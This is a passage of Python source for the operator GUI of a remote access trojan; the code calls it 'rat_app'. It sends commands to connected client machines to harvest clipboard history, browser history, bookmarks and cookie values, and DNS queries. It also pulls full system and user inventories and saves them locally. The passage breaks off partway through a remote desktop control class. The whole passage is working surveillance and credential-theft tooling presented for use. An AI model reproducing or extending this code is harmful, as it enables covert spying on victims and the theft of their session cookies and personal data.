        client_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        client_frame.pack(fill=tk.X, pady=10, padx=10)
        
        client_label = ctk.CTkLabel(client_frame, text="Connected Client:")
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.sysinfo_client_label = ctk.CTkLabel(client_frame, text="None")
        self.sysinfo_client_label.pack(side=tk.LEFT, padx=5)
        
        # Control buttons
        buttons_frame = ctk.CTkFrame(controls_frame, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        self.get_sysinfo_btn = ctk.CTkButton(buttons_frame, text="Get System Information", 
                                            command=self.get_system_info,
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"])
        self.get_sysinfo_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.get_sysinfo_btn)
        
        self.save_sysinfo_btn = ctk.CTkButton(buttons_frame, text="Save Information", 
                                             command=self.save_system_info,
                                             state="disabled",
                                             fg_color=theme["button_color"],
                                             hover_color=theme["hover_color"])
        self.save_sysinfo_btn.pack(side=tk.LEFT, padx=5)
        self.buttons.append(self.save_sysinfo_btn)
        
        # System info notebook
        sysinfo_notebook = ttk.Notebook(self.sysinfo_frame, style="Custom.TNotebook")
        sysinfo_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # General info tab
        general_frame = ctk.CTkFrame(sysinfo_notebook, fg_color=theme["card_color"])
        sysinfo_notebook.add(general_frame, text="General")
        
        self.general_info_text = scrolledtext.ScrolledText(general_frame, wrap=tk.WORD, background=theme['bg_color'], foreground=theme['fg_color'])
        self.general_info_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.general_info_text)
        
        # Hardware info tab
        hardware_frame = ctk.CTkFrame(sysinfo_notebook, fg_color=theme["card_color"])
        sysinfo_notebook.add(hardware_frame, text="Hardware/Network")
        
        self.hardware_info_text = scrolledtext.ScrolledText(hardware_frame, wrap=tk.WORD, background=theme['bg_color'], foreground=theme['fg_color'])
        self.hardware_info_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.hardware_info_text)
        
        # Software info tab
        software_frame = ctk.CTkFrame(sysinfo_notebook, fg_color=theme["card_color"])
        sysinfo_notebook.add(software_frame, text="Software")
        
        self.software_info_text = scrolledtext.ScrolledText(software_frame, wrap=tk.WORD, background=theme['bg_color'], foreground=theme['fg_color'])
        self.software_info_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.software_info_text)
        
        # Users info tab
        users_frame = ctk.CTkFrame(sysinfo_notebook, fg_color=theme["card_color"])
        sysinfo_notebook.add(users_frame, text="Users")
        
        self.users_info_text = scrolledtext.ScrolledText(users_frame, wrap=tk.WORD, background=theme['bg_color'], foreground=theme['fg_color'])
        self.users_info_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.users_info_text)
        
        # Startup info tab
        startup_frame = ctk.CTkFrame(sysinfo_notebook, fg_color=theme["card_color"])
        sysinfo_notebook.add(startup_frame, text="Startup Items")
        
        self.startup_info_text = scrolledtext.ScrolledText(startup_frame, wrap=tk.WORD, background=theme['bg_color'], foreground=theme['fg_color'])
        self.startup_info_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.text_widgets.append(self.startup_info_text)
        
        # Store system info
        self.system_info = None
    
    # Network monitoring functions
    def update_client_info(self):
        """Update client info labels when a client is selected"""
        if self.rat_app.current_client_socket:
            for addr, (client_id, conn) in self.rat_app.clients.items():
                if conn == self.rat_app.current_client_socket:
                    client_info = f"{addr[0]}:{addr[1]}"
                    self.clipboard_client_label.configure(text=client_info)
                    self.browser_client_label.configure(text=client_info)
                    self.dns_client_label.configure(text=client_info)
                    self.sysinfo_client_label.configure(text=client_info)
                    self.analysis_client_label.configure(text=client_info)
                    return
        
        # No client selected
        self.clipboard_client_label.configure(text="None")
        self.browser_client_label.configure(text="None")
        self.dns_client_label.configure(text="None")
        self.sysinfo_client_label.configure(text="None")
    
    
    # Clipboard monitoring functions
    def start_clipboard_monitoring(self):
        """Start clipboard monitoring on the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            self.rat_app.current_client_socket.send("START_CLIPBOARD_MONITORING".encode())
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                self.clipboard_status_label.configure(text="Monitoring...")
                self.start_clipboard_btn.configure(state="disabled")
                self.stop_clipboard_btn.configure(state="normal")
                self.rat_app.log("Started clipboard monitoring on client")
            else:
                self.clipboard_status_label.configure(text="Error")
                self.rat_app.log(f"Error starting clipboard monitoring: {response}")
        
        except Exception as e:
            self.rat_app.log(f"Error sending clipboard monitoring command: {e}")
    
    def stop_clipboard_monitoring(self):
        """Stop clipboard monitoring on the client"""
        if not self.rat_app.current_client_socket:
            return
        
        try:
            self.rat_app.current_client_socket.send("STOP_CLIPBOARD_MONITORING".encode())
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                self.clipboard_status_label.configure(text="Stopped")
                self.start_clipboard_btn.configure(state="normal")
                self.stop_clipboard_btn.configure(state="disabled")
                self.rat_app.log("Stopped clipboard monitoring on client")
            else:
                self.rat_app.log(f"Error stopping clipboard monitoring: {response}")
        
        except Exception as e:
            self.rat_app.log(f"Error sending stop clipboard monitoring command: {e}")
    
    def get_clipboard_data(self):
        """Get clipboard data from the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            self.clipboard_status_label.configure(text="Retrieving...")
            self.rat_app.log("Requesting clipboard data...")
            
            self.rat_app.current_client_socket.send("GET_CLIPBOARD_DATA".encode())
            
            # Get size of clipboard data
            size_data = self.rat_app.current_client_socket.recv(8)
            if not size_data or len(size_data) != 8:
                self.rat_app.log("Error: Received invalid size data")
                self.clipboard_status_label.configure(text="Error")
                return
                
            data_size = struct.unpack('Q', size_data)[0]
            
            if data_size == 0:
                self.rat_app.log("No clipboard data available")
                self.clipboard_status_label.configure(text="No data")
                return
            
            # Receive data
            data = b""
            while len(data) < data_size:
                chunk = self.rat_app.current_client_socket.recv(min(data_size - len(data), 4096))
                if not chunk:
                    break
                data += chunk
            
            # Parse JSON data
            clipboard_data = json.loads(data.decode('utf-8'))
            
            # Display in text widget
            self.clipboard_data_text.delete(1.0, tk.END)
            
            if not clipboard_data:
                self.clipboard_data_text.insert(tk.END, "No clipboard history found")
            else:
                for item in clipboard_data:
                    timestamp = item.get('timestamp', 'Unknown')
                    value = item.get('value', '')
                    
                    self.clipboard_data_text.insert(tk.END, f"[{timestamp}]\n")
                    self.clipboard_data_text.insert(tk.END, f"{value}\n\n")
            
            self.clipboard_status_label.configure(text=f"Received {len(clipboard_data)} entries")
            self.rat_app.log(f"Received {len(clipboard_data)} clipboard entries")
            
        except Exception as e:
            self.rat_app.log(f"Error getting clipboard data: {e}")
            self.clipboard_status_label.configure(text="Error")
    
    def clear_clipboard_display(self):
        """Clear the clipboard display"""
        self.clipboard_data_text.delete(1.0, tk.END)
    
    # Browser data functions
    def extract_browser_data(self):
        """Extract browser data from the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            self.browser_status_label.configure(text="Extracting...")
            self.rat_app.log("Requesting browser data...")
            
            self.rat_app.current_client_socket.send("EXTRACT_BROWSER_DATA".encode())
            
            # Get size of browser data
            size_data = self.rat_app.current_client_socket.recv(8)
            if not size_data or len(size_data) != 8:
                self.rat_app.log("Error: Received invalid size data")
                self.browser_status_label.configure(text="Error")
                return
                
            data_size = struct.unpack('Q', size_data)[0]
            
            if data_size == 0:
                self.rat_app.log("No browser data available")
                self.browser_status_label.configure(text="No data")
                return
            
            # Receive data
            data = b""
            while len(data) < data_size:
                chunk = self.rat_app.current_client_socket.recv(min(data_size - len(data), 4096))
                if not chunk:
                    break
                data += chunk
            
            # Parse JSON data
            self.browser_data = json.loads(data.decode('utf-8'))
            
            # Display data based on selected browser and type
            self.display_browser_data()
            
            self.browser_status_label.configure(text="Data received")
            self.save_browser_btn.configure(state="normal")
            self.rat_app.log("Browser data received successfully")
            
        except Exception as e:
            self.rat_app.log(f"Error extracting browser data: {e}")
            self.browser_status_label.configure(text="Error")
    
    def display_browser_data(self):
        """Display browser data in the appropriate text widget"""
        if not self.browser_data:
            return
        
        browser = self.browser_var.get()
        data_type = self.datatype_var.get()
        
        # Clear text widgets
        self.chrome_data_text.delete(1.0, tk.END)
        self.firefox_data_text.delete(1.0, tk.END)
        self.edge_data_text.delete(1.0, tk.END)
        
        # Get data for each browser
        if 'chrome' in self.browser_data:
            self.display_browser_type_data(self.chrome_data_text, self.browser_data['chrome'].get(data_type, []))
        
        if 'firefox' in self.browser_data:
            self.display_browser_type_data(self.firefox_data_text, self.browser_data['firefox'].get(data_type, []))
        
        if 'edge' in self.browser_data:
            self.display_browser_type_data(self.edge_data_text, self.browser_data['edge'].get(data_type, []))
    
    def display_browser_type_data(self, text_widget, data):
        """Display specific browser data in the given text widget"""
        text_widget.delete(1.0, tk.END)
        
        if not data:
            text_widget.insert(tk.END, "No data available")
            return
        
        data_type = self.datatype_var.get()
        
        if data_type == 'history':
            # Format history entries
            text_widget.insert(tk.END, "BROWSING HISTORY\n\n")
            for item in data:
                timestamp = item.get('timestamp', 'Unknown')
                url = item.get('url', 'Unknown URL')
                title = item.get('title', 'Unknown Title')
                
                text_widget.insert(tk.END, f"[{timestamp}] {title}\n")
                text_widget.insert(tk.END, f"{url}\n\n")
                
        elif data_type == 'bookmarks':
            # Format bookmark entries
            text_widget.insert(tk.END, "BOOKMARKS\n\n")
            for item in data:
                name = item.get('name', 'Unknown Bookmark')
                url = item.get('url', 'Unknown URL')
                
                text_widget.insert(tk.END, f"{name}\n")
                text_widget.insert(tk.END, f"{url}\n\n")
                
        elif data_type == 'cookies':
            # Format cookie entries
            text_widget.insert(tk.END, "COOKIES\n\n")
            for item in data:
                domain = item.get('domain', 'Unknown Domain')
                name = item.get('name', 'Unknown Name')
                value = item.get('value', '')
                path = item.get('path', '/')
                
                text_widget.insert(tk.END, f"Domain: {domain}\n")
                text_widget.insert(tk.END, f"Name: {name}\n")
                text_widget.insert(tk.END, f"Value: {value}\n")
                text_widget.insert(tk.END, f"Path: {path}\n\n")
    
    def save_browser_data(self):
        """Save browser data to a file"""
        if not self.browser_data:
            messagebox.showinfo("No Data", "No browser data available to save")
            return
        
        try:
            # Ask user for save location
            filename = filedialog.asksaveasfilename(
                defaultextension=".json",
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                title="Save Browser Data"
            )
            
            if not filename:
                return  # User cancelled
            
            # Write JSON data to file
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.browser_data, f, indent=4)
            
            self.rat_app.log(f"Browser data saved to {filename}")
            messagebox.showinfo("Save Complete", f"Browser data saved to {filename}")
            
        except Exception as e:
            self.rat_app.log(f"Error saving browser data: {e}")
            messagebox.showerror("Error", f"Error saving data: {e}")
    
    # DNS monitoring functions
    def start_dns_monitoring(self):
        """Start DNS monitoring on the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            self.rat_app.current_client_socket.send("START_DNS_MONITORING".encode())
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                self.dns_status_label.configure(text="Monitoring...")
                self.start_dns_btn.configure(state="disabled")
                self.stop_dns_btn.configure(state="normal")
                self.rat_app.log("Started DNS monitoring on client")
            else:
                self.dns_status_label.configure(text="Error")
                self.rat_app.log(f"Error starting DNS monitoring: {response}")
        
        except Exception as e:
            self.rat_app.log(f"Error sending DNS monitoring command: {e}")
    
    def stop_dns_monitoring(self):
        """Stop DNS monitoring on the client"""
        if not self.rat_app.current_client_socket:
            return
        
        try:
            self.rat_app.current_client_socket.send("STOP_DNS_MONITORING".encode())
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                self.dns_status_label.configure(text="Stopped")
                self.start_dns_btn.configure(state="normal")
                self.stop_dns_btn.configure(state="disabled")
                self.rat_app.log("Stopped DNS monitoring on client")
            else:
                self.rat_app.log(f"Error stopping DNS monitoring: {response}")
        
        except Exception as e:
            self.rat_app.log(f"Error sending stop DNS monitoring command: {e}")
    
    def get_dns_history(self):
        """Get DNS query history from the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            self.dns_status_label.configure(text="Retrieving...")
            self.rat_app.log("Requesting DNS history...")
            
            self.rat_app.current_client_socket.send("GET_DNS_HISTORY".encode())
            
            # Get size of DNS history data
            size_data = self.rat_app.current_client_socket.recv(8)
            if not size_data or len(size_data) != 8:
                self.rat_app.log("Error: Received invalid size data")
                self.dns_status_label.configure(text="Error")
                return
                
            data_size = struct.unpack('Q', size_data)[0]
            
            if data_size == 0:
                self.rat_app.log("No DNS history available")
                self.dns_status_label.configure(text="No data")
                return
            
            # Receive data
            data = b""
            while len(data) < data_size:
                chunk = self.rat_app.current_client_socket.recv(min(data_size - len(data), 4096))
                if not chunk:
                    break
                data += chunk
            
            # Parse JSON data
            self.dns_history = json.loads(data.decode('utf-8'))
            
            # Display in treeview
            self.update_dns_treeview()
            
            self.dns_status_label.configure(text=f"Received {len(self.dns_history)} entries")
            self.save_dns_btn.configure(state="normal")
            self.rat_app.log(f"Received {len(self.dns_history)} DNS entries")
            
        except Exception as e:
            self.rat_app.log(f"Error getting DNS history: {e}")
            self.dns_status_label.configure(text="Error")
    
    def update_dns_treeview(self):
        """Update the DNS treeview with history data"""
        # Clear existing items
        for item in self.dns_tree.get_children():
            self.dns_tree.delete(item)
        
        if not self.dns_history:
            return
        
        # Get filter text
        filter_text = self.dns_filter_entry.get().lower()
        
        # Add DNS entries to treeview
        for entry in self.dns_history:
            timestamp = entry.get('timestamp', 'Unknown')
            query = entry.get('query', 'Unknown')
            query_type = entry.get('type', 'Unknown')
            
            # Apply filter if set
            if filter_text and filter_text not in query.lower():
                continue
            
            self.dns_tree.insert("", "end", values=(timestamp, query, query_type))
    
    def filter_dns_history(self, event=None):
        """Filter DNS history based on search text"""
        self.update_dns_treeview()
    
    def save_dns_data(self):
        """Save DNS history to a file"""
        if not self.dns_history:
            messagebox.showinfo("No Data", "No DNS history available to save")
            return
        
        try:
            # Ask user for save location
            filename = filedialog.asksaveasfilename(
                defaultextension=".json",
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                title="Save DNS History"
            )
            
            if not filename:
                return  # User cancelled
            
            # Write JSON data to file
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.dns_history, f, indent=4)
            
            self.rat_app.log(f"DNS history saved to {filename}")
            messagebox.showinfo("Save Complete", f"DNS history saved to {filename}")
            
        except Exception as e:
            self.rat_app.log(f"Error saving DNS history: {e}")
            messagebox.showerror("Error", f"Error saving data: {e}")
    
    # System information functions
    def get_system_info(self):
        """Get system information from the client"""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
        
        try:
            self.rat_app.log("Requesting system information...")
            
            self.rat_app.current_client_socket.send("GET_SYSTEM_INFO".encode())
            
            # Get size of system info data
            size_data = self.rat_app.current_client_socket.recv(8)
            if not size_data or len(size_data) != 8:
                self.rat_app.log("Error: Received invalid size data")
                return
                
            data_size = struct.unpack('Q', size_data)[0]
            
            if data_size == 0:
                self.rat_app.log("No system information available")
                return
            
            # Receive data
            data = b""
            while len(data) < data_size:
                chunk = self.rat_app.current_client_socket.recv(min(data_size - len(data), 4096))
                if not chunk:
                    break
                data += chunk
            
            # Parse JSON data
            self.system_info = json.loads(data.decode('utf-8'))
            
            # Display system information in text widgets
            self.display_system_info()
            
            self.save_sysinfo_btn.configure(state="normal")
            self.rat_app.log("System information received successfully")
            
        except Exception as e:
            self.rat_app.log(f"Error getting system information: {e}")
    
    def display_system_info(self):
        """Display system information in the appropriate text widgets"""
        if not self.system_info:
            return
        
        # Format general system info
        self.general_info_text.delete(1.0, tk.END)
        self.general_info_text.insert(tk.END, "SYSTEM INFORMATION\n\n")
        self.general_info_text.insert(tk.END, f"Platform: {self.system_info.get('platform', 'Unknown')}\n")
        self.general_info_text.insert(tk.END, f"Platform Release: {self.system_info.get('platform_release', 'Unknown')}\n")
        self.general_info_text.insert(tk.END, f"Platform Version: {self.system_info.get('platform_version', 'Unknown')}\n")
        self.general_info_text.insert(tk.END, f"Architecture: {self.system_info.get('architecture', 'Unknown')}\n")
        self.general_info_text.insert(tk.END, f"Hostname: {self.system_info.get('hostname', 'Unknown')}\n")
        self.general_info_text.insert(tk.END, f"IP Address: {self.system_info.get('ip_address', 'Unknown')}\n")
        self.general_info_text.insert(tk.END, f"MAC Address: {self.system_info.get('mac_address', 'Unknown')}\n")
        self.general_info_text.insert(tk.END, f"Processor: {self.system_info.get('processor', 'Unknown')}\n")
        self.general_info_text.insert(tk.END, f"RAM: {self.system_info.get('ram', 'Unknown')}\n")
        
        # Format hardware and network info
        self.hardware_info_text.delete(1.0, tk.END)
        self.hardware_info_text.insert(tk.END, "NETWORK INTERFACES\n\n")
        
        for interface in self.system_info.get('network_interfaces', []):
            self.hardware_info_text.insert(tk.END, f"Interface: {interface.get('interface', 'Unknown')}\n")
            self.hardware_info_text.insert(tk.END, f"IP Address: {interface.get('ip', 'Unknown')}\n")
            self.hardware_info_text.insert(tk.END, f"Netmask: {interface.get('netmask', 'Unknown')}\n")
            if interface.get('broadcast'):
                self.hardware_info_text.insert(tk.END, f"Broadcast: {interface.get('broadcast')}\n")
            self.hardware_info_text.insert(tk.END, "\n")
        
        # Format software info
        self.software_info_text.delete(1.0, tk.END)
        self.software_info_text.insert(tk.END, "INSTALLED SOFTWARE\n\n")
        
        for software in self.system_info.get('installed_software', []):
            self.software_info_text.insert(tk.END, f"Name: {software.get('name', 'Unknown')}\n")
            self.software_info_text.insert(tk.END, f"Version: {software.get('version', 'Unknown')}\n")
            self.software_info_text.insert(tk.END, f"Publisher: {software.get('publisher', 'Unknown')}\n")
            self.software_info_text.insert(tk.END, f"Install Date: {software.get('install_date', 'Unknown')}\n\n")
        
        # Format users info
        self.users_info_text.delete(1.0, tk.END)
        self.users_info_text.insert(tk.END, "SYSTEM USERS\n\n")
        
        for user in self.system_info.get('users', []):
            self.users_info_text.insert(tk.END, f"Name: {user.get('name', 'Unknown')}\n")
            if 'uid' in user:
                self.users_info_text.insert(tk.END, f"UID: {user.get('uid')}\n")
            if 'comment' in user:
                self.users_info_text.insert(tk.END, f"Comment: {user.get('comment')}\n")
            if 'home' in user:
                self.users_info_text.insert(tk.END, f"Home: {user.get('home')}\n")
            if 'shell' in user:
                self.users_info_text.insert(tk.END, f"Shell: {user.get('shell')}\n")
            self.users_info_text.insert(tk.END, "\n")
        
        self.users_info_text.insert(tk.END, "LOGGED IN USERS\n\n")
        
        for user in self.system_info.get('logged_in_users', []):
            self.users_info_text.insert(tk.END, f"Name: {user.get('name', 'Unknown')}\n")
            self.users_info_text.insert(tk.END, f"Terminal: {user.get('terminal', 'Unknown')}\n")
            if user.get('host'):
                self.users_info_text.insert(tk.END, f"Host: {user.get('host')}\n")
            self.users_info_text.insert(tk.END, f"Started: {user.get('started', 'Unknown')}\n\n")
        
        # Format startup items
        self.startup_info_text.delete(1.0, tk.END)
        self.startup_info_text.insert(tk.END, "STARTUP ITEMS\n\n")
        
        for item in self.system_info.get('startup_items', []):
            self.startup_info_text.insert(tk.END, f"Name: {item.get('name', 'Unknown')}\n")
            self.startup_info_text.insert(tk.END, f"Source: {item.get('source', 'Unknown')}\n")
            self.startup_info_text.insert(tk.END, f"Command: {item.get('command', 'Unknown')}\n\n")
        
        # Also add services if available
        if self.system_info.get('running_services'):
            self.startup_info_text.insert(tk.END, "RUNNING SERVICES\n\n")
            
            for service in self.system_info.get('running_services', []):
                self.startup_info_text.insert(tk.END, f"Name: {service.get('name', 'Unknown')}\n")
                self.startup_info_text.insert(tk.END, f"Display Name: {service.get('display_name', 'Unknown')}\n")
                self.startup_info_text.insert(tk.END, f"Status: {service.get('status', 'Unknown')}\n")
                self.startup_info_text.insert(tk.END, f"Start Type: {service.get('start_type', 'Unknown')}\n\n")
    
    def save_system_info(self):
        """Save system information to a file"""
        if not self.system_info:
            messagebox.showinfo("No Data", "No system information available to save")
            return
        
        try:
            # Ask user for save location
            filename = filedialog.asksaveasfilename(
                defaultextension=".json",
                filetypes=[("JSON files", "*.json"), ("All files", "*.*")],
                title="Save System Information"
            )
            
            if not filename:
                return  # User cancelled
            
            # Write JSON data to file
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.system_info, f, indent=4)
            
            self.rat_app.log(f"System information saved to {filename}")
            messagebox.showinfo("Save Complete", f"System information saved to {filename}")
            
        except Exception as e:
            self.rat_app.log(f"Error saving system information: {e}")
            messagebox.showerror("Error", f"Error saving data: {e}")
    
    # Utility functions
    def format_size(self, size_bytes):
        """Convert byte size to human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size_bytes < 1024.0:
                return f"{size_bytes:.2f} {unit}"
            size_bytes /= 1024.0
        return f"{size_bytes:.2f} PB"




class RemoteDesktopControl:
    """Interface for remote desktop control on server side"""
    
    def __init__(self, parent, rat_app):
        self.parent = parent
        self.rat_app = rat_app
        self.is_controlling = False
        self.control_socket = None
        self.control_port = None
        self.last_pos = (0, 0)
        self.screen_width = 0
        self.screen_height = 0
        self.client_width = 0
        self.client_height = 0
        
        # Metrics tracking
        self.metrics_tracking = True
        self.start_time = time.time()
        self.frame_count = 0
        self.last_frame_time = time.time()
        self.fps_history = deque(maxlen=60)  # Store 60 FPS samples (1 minute at 1 sample/sec)
        self.latency_history = deque(maxlen=60)  # Store 60 latency samples
        self.bandwidth_history = deque(maxlen=60)  # Store 60 bandwidth samples
        self.last_metrics_update = time.time()
        self.last_frame_size = 0
        self.total_bytes_received = 0
        
        # Quality indicators
        self.connection_quality = "Unknown"
        self.connection_quality_level = 0  # 0-4 (Poor to Excellent)
        
        # Setup UI
        self.setup_ui()
        
    def get_theme_colors(self):
        """Get the current theme colors from the rat_app"""
        theme_name = self.rat_app.current_theme
        return self.rat_app.THEMES[theme_name]
        
    def setup_ui(self):
        """Setup the remote desktop UI"""
        theme = self.get_theme_colors()
        
        # Create main frame
        self.remote_desktop_frame = ctk.CTkFrame(self.parent)
        self.parent.add(self.remote_desktop_frame, text="Remote Desktop")
        
        # Top panel with controls and info
        self.control_panel = ctk.CTkFrame(self.remote_desktop_frame, fg_color=theme["card_color"])
        self.control_panel.pack(fill=tk.X, padx=10, pady=10)
        
        # Client info display
        client_frame = ctk.CTkFrame(self.control_panel, fg_color="transparent")
        client_frame.pack(fill=tk.X, pady=10, padx=10)
        
        client_label = ctk.CTkLabel(client_frame, text="Connected Client:", 
                                  font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                  size=FONT_STYLES["normal"][1], 
                                                  weight="bold"))
        client_label.pack(side=tk.LEFT, padx=5)
        
        self.client_info_label = ctk.CTkLabel(client_frame, text="None")
        self.client_info_label.pack(side=tk.LEFT, padx=5)
        
        # Control port entry
        port_frame = ctk.CTkFrame(self.control_panel, fg_color="transparent")
        port_frame.pack(fill=tk.X, pady=5, padx=10)
        
        port_label = ctk.CTkLabel(port_frame, text="Control Port:", 
                                font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                size=FONT_STYLES["normal"][1], 
                                                weight="bold"))
        port_label.pack(side=tk.LEFT, padx=5)
        
        self.port_entry = ctk.CTkEntry(port_frame, width=100)
        self.port_entry.pack(side=tk.LEFT, padx=5)
        self.port_entry.insert(0, "4445")  # Default control port
        
        # Control buttons
        buttons_frame = ctk.CTkFrame(self.control_panel, fg_color="transparent")
        buttons_frame.pack(fill=tk.X, pady=10, padx=10)
        
        self.start_control_btn = ctk.CTkButton(buttons_frame, text="Start Remote Control", 
                                             command=self.start_remote_control,
                                             fg_color=theme["button_color"],
                                             hover_color=theme["hover_color"])
        self.start_control_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_control_btn = ctk.CTkButton(buttons_frame, text="Stop Remote Control", 
                                            command=self.stop_remote_control,
                                            state="disabled",
                                            fg_color=theme["danger_color"],
                                            hover_color=theme["hover_color"])
        self.stop_control_btn.pack(side=tk.LEFT, padx=5)
        
        # Quality and FPS settings
        settings_frame = ctk.CTkFrame(self.control_panel, fg_color="transparent")
        settings_frame.pack(fill=tk.X, pady=5, padx=10)
        
        # Quality slider
        quality_label = ctk.CTkLabel(settings_frame, text="Quality:", 
                                   font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                   size=FONT_STYLES["normal"][1]))
        quality_label.pack(side=tk.LEFT, padx=5)
        
        self.quality_var = tk.IntVar(value=30)
        quality_slider = ctk.CTkSlider(settings_frame, from_=1, to=100, 
                                      variable=self.quality_var,
                                      width=100)
        quality_slider.pack(side=tk.LEFT, padx=5)
        
        self.quality_value = ctk.CTkLabel(settings_frame, text="30")
        self.quality_value.pack(side=tk.LEFT, padx=5)
        
        # FPS slider
        fps_label = ctk.CTkLabel(settings_frame, text="FPS:", 
                               font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                size=FONT_STYLES["normal"][1]))
        fps_label.pack(side=tk.LEFT, padx=15)
        
        self.fps_var = tk.IntVar(value=10)
        fps_slider = ctk.CTkSlider(settings_frame, from_=1, to=30, 
                                  variable=self.fps_var,
                                  width=100)
        fps_slider.pack(side=tk.LEFT, padx=5)
        
        self.fps_value = ctk.CTkLabel(settings_frame, text="10")
        self.fps_value.pack(side=tk.LEFT, padx=5)
        
        # Bind value updates
        self.quality_var.trace_add("write", self.update_quality_label)
        self.fps_var.trace_add("write", self.update_fps_label)
        
        # Add Connection Metrics Panel
        metrics_frame = ctk.CTkFrame(self.control_panel, fg_color=theme["card_color"])
        metrics_frame.pack(fill=tk.X, pady=5, padx=10)
        
        metrics_header = ctk.CTkLabel(metrics_frame, text="Connection Metrics", 
                                    font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                    size=FONT_STYLES["normal"][1], 
                                                    weight="bold"))
        metrics_header.pack(pady=(5, 0))
        
        # Metrics display rows
        metrics_grid = ctk.CTkFrame(metrics_frame, fg_color="transparent")
        metrics_grid.pack(fill=tk.X, pady=5, padx=10)
        
        # Create metrics display with labels and values
        # Row 1: FPS and Latency
        metrics_row1 = ctk.CTkFrame(metrics_grid, fg_color="transparent")
        metrics_row1.pack(fill=tk.X, pady=2)
        
        # FPS
        fps_metric_label = ctk.CTkLabel(metrics_row1, text="FPS:", width=80,
                                       font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                       size=FONT_STYLES["normal"][1]))
        fps_metric_label.pack(side=tk.LEFT, padx=5)
        
        self.fps_metric_value = ctk.CTkLabel(metrics_row1, text="0.0", width=50,
                                           font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                           size=FONT_STYLES["normal"][1]))
        self.fps_metric_value.pack(side=tk.LEFT, padx=5)
        
        # Latency
        latency_label = ctk.CTkLabel(metrics_row1, text="Latency:", width=80,
                                    font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                    size=FONT_STYLES["normal"][1]))
        latency_label.pack(side=tk.LEFT, padx=5)
        
        self.latency_value = ctk.CTkLabel(metrics_row1, text="0 ms", width=50,
                                        font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                        size=FONT_STYLES["normal"][1]))
        self.latency_value.pack(side=tk.LEFT, padx=5)
        
        # Row 2: Bandwidth and Quality
        metrics_row2 = ctk.CTkFrame(metrics_grid, fg_color="transparent")
        metrics_row2.pack(fill=tk.X, pady=2)
        
        # Bandwidth
        bandwidth_label = ctk.CTkLabel(metrics_row2, text="Bandwidth:", width=80,
                                      font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                      size=FONT_STYLES["normal"][1]))
        bandwidth_label.pack(side=tk.LEFT, padx=5)
        
        self.bandwidth_value = ctk.CTkLabel(metrics_row2, text="0 KB/s", width=50,
                                          font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                          size=FONT_STYLES["normal"][1]))
        self.bandwidth_value.pack(side=tk.LEFT, padx=5)
        
        # Connection Quality
        quality_metric_label = ctk.CTkLabel(metrics_row2, text="Quality:", width=80,
                                          font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                          size=FONT_STYLES["normal"][1]))
        quality_metric_label.pack(side=tk.LEFT, padx=5)
        
        self.quality_metric_value = ctk.CTkLabel(metrics_row2, text="Unknown", width=50,
                                               font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                               size=FONT_STYLES["normal"][1]))
        self.quality_metric_value.pack(side=tk.LEFT, padx=5)
        
        # Add Connection Quality Visualization
        quality_viz_frame = ctk.CTkFrame(metrics_frame, fg_color="transparent")
        quality_viz_frame.pack(fill=tk.X, pady=5)
        
        # Create 5 indicators for quality levels (Poor, Fair, Good, Very Good, Excellent)
        self.quality_indicators = []
        quality_labels = ["Poor", "Fair", "Good", "Very Good", "Excellent"]
        quality_colors = ["#FF4444", "#FFAA33", "#FFFF33", "#AAFF33", "#33FF33"]
        
        for i in range(5):
            indicator_frame = ctk.CTkFrame(quality_viz_frame, fg_color="transparent")
            indicator_frame.pack(side=tk.LEFT, expand=True, fill=tk.X, padx=2)
            
            # Create the circle indicator
            indicator = tk.Canvas(indicator_frame, width=15, height=15, 
                               highlightthickness=0, bg=theme["card_color"])
